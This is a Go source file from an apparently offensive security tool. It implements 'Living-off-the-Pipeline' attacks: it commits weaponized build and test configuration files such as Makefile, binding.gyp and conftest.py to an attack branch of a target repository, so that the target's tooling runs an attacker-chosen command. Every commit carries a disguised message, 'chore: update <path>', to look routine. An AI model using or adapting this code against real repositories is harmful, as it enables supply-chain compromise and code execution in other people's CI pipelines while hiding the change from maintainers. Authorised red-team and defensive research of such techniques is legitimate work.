package attack

import (
	"context"
	"encoding/json"
	"fmt"

	"github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
)

// LOTPAttack orchestrates Living-off-the-Pipeline attacks by weaponizing tool
// configuration files (binding.gyp, Makefile, conftest.py, etc.) in the target
// repository and committing them to an attack branch.
type LOTPAttack struct {
	*Attacker
}

// NewLOTPAttack constructs a LOTPAttack wrapping the given Attacker.
func NewLOTPAttack(att *Attacker) *LOTPAttack {
	return &LOTPAttack{Attacker: att}
}

// LOTPResult captures the outcome of an InjectLOTPPayload call.
type LOTPResult struct {
	Branch      string   `json:"branch"`
	Tool        string   `json:"tool"`
	FilesCommitted []string `json:"files_committed"`
	Description string   `json:"description"`
	Reference   string   `json:"reference"`
}

// InjectLOTPPayload commits a weaponized LOTP config payload to the given branch
// of the target project. It:
//  1. Generates the payload files for the requested tool.
//  2. Ensures the attack branch exists (creates from default if needed).
//  3. Commits every payload file to the branch via UpsertFile (create-or-update).
//
// Returns a LOTPResult describing what was committed.
func (l *LOTPAttack) InjectLOTPPayload(ctx context.Context, projectID any, branch, tool, cmd string) (*LOTPResult, error) {
	if _, err := l.SetupUser(ctx); err != nil {
		return nil, fmt.Errorf("setup user: %w", err)
	}

	p, err := payloads.GenerateLOTPPayload(tool, cmd)
	if err != nil {
		return nil, fmt.Errorf("generate LOTP payload: %w", err)
	}

	if err := l.EnsureBranch(ctx, projectID, branch); err != nil {
		return nil, fmt.Errorf("ensure branch: %w", err)
	}

	var committed []string
	for _, f := range p.Files {
		msg := fmt.Sprintf("chore: update %s", f.Path)
		if err := l.UpsertFile(ctx, projectID, branch, f.Path, f.Content, msg); err != nil {
			return nil, fmt.Errorf("commit %s: %w", f.Path, err)
		}
		committed = append(committed, f.Path)
	}

	return &LOTPResult{
		Branch:         branch,
		Tool:           p.Tool,
		FilesCommitted: committed,
		Description:    p.Description,
		Reference:      p.Reference,
	}, nil
}

// MarshalJSON emits LOTPResult as indented JSON for CLI output.
func (r *LOTPResult) MarshalJSON() ([]byte, error) {
	type alias LOTPResult
	return json.MarshalIndent((*alias)(r), "", "  ")
}
